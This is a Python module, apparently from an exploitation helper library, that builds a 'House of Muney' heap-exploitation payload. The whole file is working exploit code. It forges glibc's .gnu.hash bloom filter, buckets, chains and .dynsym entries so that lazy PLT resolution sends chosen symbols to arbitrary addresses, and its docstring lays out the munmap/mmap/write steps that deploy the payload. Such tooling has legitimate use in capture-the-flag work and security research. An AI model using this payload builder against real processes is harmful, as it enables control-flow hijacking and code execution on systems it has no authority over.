"""House of Muney — leakless heap exploitation via symbol resolution hijacking.

Forge the beginning of a libc mapping (.gnu.hash + .dynsym) so that lazy
symbol resolution redirects chosen symbols to arbitrary addresses.
"""

from __future__ import annotations

import struct
from collections import defaultdict
from typing import TYPE_CHECKING, Dict

if TYPE_CHECKING:
    from pwn import ELF


def _dl_new_hash(name: str) -> int:
    """Compute the GNU hash (``dl_new_hash``) used by the dynamic linker."""
    h = 5381
    for c in name.encode():
        h = (h * 33 + c) & 0xFFFFFFFF
    return h


def house_of_muney(glibc: "ELF", resolve: Dict[str, int]) -> bytes:
    """Build a House of Muney payload that hijacks glibc symbol resolution.

    Given a pwntools ``ELF`` for the system libc and a mapping of symbol
    names to desired resolution addresses, construct the minimal byte
    string that should replace the beginning of the libc memory mapping
    so that the dynamic linker's lazy binding redirects the listed symbols
    to the supplied addresses.

    The caller is expected to:

    1. ``munmap`` the first *len(payload)* bytes of the libc mapping.
    2. ``mmap`` the same region back (anonymous, RW).
    3. Write the returned payload into that region.

    Any subsequent lazy PLT resolution for a symbol listed in *resolve*
    will then land at the address given in the dict.

    Args:
        glibc: pwntools ``ELF`` object for the target libc.  Its
            ``.address`` may be 0 (file-relative) or set to the
            runtime base — either is handled correctly.
        resolve: ``{symbol_name: target_address}`` where addresses
            are in the same coordinate space as ``glibc.symbols``
            (i.e. they include ``glibc.address`` when it is set).

    Returns:
        Page-aligned ``bytes`` to overwrite the start of the libc
        mapping with.
    """
    from elftools.elf.elffile import ELFFile

    if not resolve:
        return b""

    with open(glibc.path, "rb") as fh:
        elffile = ELFFile(fh)
        is_64 = elffile.elfclass == 64
        addr_size = 8 if is_64 else 4
        native_class = 64 if is_64 else 32
        sym_entry_size = 24 if is_64 else 16
        addr_fmt = "<Q" if is_64 else "<I"
        st_value_offset = 8 if is_64 else 4

        min_vaddr = min(
            seg.header.p_vaddr
            for seg in elffile.iter_segments()
            if seg.header.p_type == "PT_LOAD"
        )

        # ── .gnu.hash ────────────────────────────────────────────
        gnu_hash_sec = elffile.get_section_by_name(".gnu.hash")
        if gnu_hash_sec is None:
            raise ValueError("libc has no .gnu.hash section")
        gnu_hash_data = gnu_hash_sec.data()
        gnu_hash_off = gnu_hash_sec.header.sh_addr - min_vaddr

        nbuckets, symndx, maskwords, shift2 = struct.unpack_from(
            "<IIII", gnu_hash_data
        )

        bloom_off = gnu_hash_off + 16
        buckets_off = bloom_off + maskwords * addr_size
        chains_file_off = buckets_off + nbuckets * 4
        chain_zero_off = chains_file_off - symndx * 4

        # ── .dynsym ─────────────────────────────────────────────
        dynsym_sec = elffile.get_section_by_name(".dynsym")
        if dynsym_sec is None:
            raise ValueError("libc has no .dynsym section")
        dynsym_data = dynsym_sec.data()
        dynsym_off = dynsym_sec.header.sh_addr - min_vaddr

        # ── locate requested symbols ────────────────────────────
        sym_entries: Dict[str, tuple] = {}
        for i, sym in enumerate(dynsym_sec.iter_symbols()):
            if sym.name in resolve:
                raw = dynsym_data[i * sym_entry_size : (i + 1) * sym_entry_size]
                sym_entries[sym.name] = (i, raw)

        missing = set(resolve) - set(sym_entries)
        if missing:
            raise ValueError(f"symbols not found in .dynsym: {missing}")

        # ── compute payload size (page-aligned) ─────────────────
        max_off = 0
        for _name, (idx, _raw) in sym_entries.items():
            max_off = max(max_off, dynsym_off + (idx + 1) * sym_entry_size)
            max_off = max(max_off, chain_zero_off + (idx + 1) * 4)

        payload_size = (max_off + 0xFFF) & ~0xFFF
        payload = bytearray(payload_size)

        # ── group symbols by bucket for chain construction ───────
        bucket_groups: Dict[int, list] = defaultdict(list)
        for name in resolve:
            idx, raw = sym_entries[name]
            new_hash = _dl_new_hash(name)
            bucket_idx = new_hash % nbuckets
            bucket_groups[bucket_idx].append((idx, name, new_hash, raw))

        for _bucket_idx, group in bucket_groups.items():
            group.sort(key=lambda t: t[0])

            # bucket → first symbol index in this chain
            struct.pack_into(
                "<I", payload, buckets_off + _bucket_idx * 4, group[0][0]
            )

            for i, (idx, _n, new_hash, _r) in enumerate(group):
                is_last = i == len(group) - 1
                # top 31 bits must match new_hash; bit 0 = end-of-chain flag
                chain_val = (new_hash & ~1) | (1 if is_last else 0)
                struct.pack_into("<I", payload, chain_zero_off + idx * 4, chain_val)

        # ── bloom filter entries ─────────────────────────────────
        for name in resolve:
            idx, _ = sym_entries[name]
            new_hash = _dl_new_hash(name)

            bitmask_idx = (new_hash // native_class) & (maskwords - 1)
            hashbit1 = new_hash & (native_class - 1)
            hashbit2 = (new_hash >> shift2) & (native_class - 1)

            bw_off = bloom_off + bitmask_idx * addr_size
            existing = struct.unpack_from(addr_fmt, payload, bw_off)[0]
            bitmask_word = existing | (1 << hashbit1) | (1 << hashbit2)
            struct.pack_into(addr_fmt, payload, bw_off, bitmask_word)

        # ── forged .dynsym entries ───────────────────────────────
        for name, target in resolve.items():
            idx, raw = sym_entries[name]
            raw = bytearray(raw)

            st_value = target - glibc.address + min_vaddr
            if is_64:
                struct.pack_into("<Q", raw, st_value_offset, st_value)
            else:
                struct.pack_into("<I", raw, st_value_offset, st_value)

            off = dynsym_off + idx * sym_entry_size
            payload[off : off + sym_entry_size] = raw

    return bytes(payload)
